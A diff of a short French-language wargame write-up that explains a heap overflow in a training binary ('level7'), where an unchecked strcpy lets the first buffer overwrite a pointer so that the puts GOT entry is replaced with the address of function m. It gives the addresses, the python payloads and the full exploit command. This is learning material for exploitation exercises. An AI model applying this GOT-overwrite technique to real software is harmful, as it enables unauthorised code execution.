@@ -1,13 +1,34 @@
 http://www.kroosec.com/2012/12/protostar-heap1.html
 
-first strcpy :	argv[0]: 0x804a018 --> 0x0
-				argv[1]: 0xbffff44a ("Aa0Aa1Aa2Aa3"...)
-
-second strcpy :	argv[0]: 0x37614136 ('6Aa7')
-				argv[1]: 0xbffff63f ("Aa0Aa1Aa2Aa3A"...)
-
 
 puts addr	= 0x08049928
 
 m addr		= 0x080484f4
 
+Nous avons un binaire qui alloue de la memoire et qui strcpy argv[1] et argv[2]
+
+en faisant ltrace ./level7 l l, on vois que les deux malloc ont 20 octets d'ecart.
+
+Si on remplie le premier argument avec 30 'a' On vois sous gdb qu'il y  un depassement
+et qu'on ecris dans la zone du deuxieme malloc.
+
+Il n'y a pas de verification de taille.
+
+Nous devons ecrire l'adresse de puts a l'adresse du deuxieme malloc via argv[1]
+
+On remplie de buffer par 20 caracteres random puis l'adresse de puts recuperer via :
+
+objdump -R ./level7 | grep puts
+python -c 'print("a" * 20 + "\x28\x99\x04\x08")'
+
+puis on donne l'adresse de la fonction m dans argv[2]
+python -c 'print("\xf4\x84\x04\x08")'
+
+Sa va remplacer l'adresse de puts par l'adresse qu'on a specifier
+dans ce qu'on apelle la global offset table.
+
+lorsque que le programme atteindra la ligne 214 (puts("~~"))
+
+la fonction apellera la fonction m.
+
+./level7 `python -c 'print("a" * 20 + "\x28\x99\x04\x08")'` `python -c 'print("\xf4\x84\x04\x08")'`
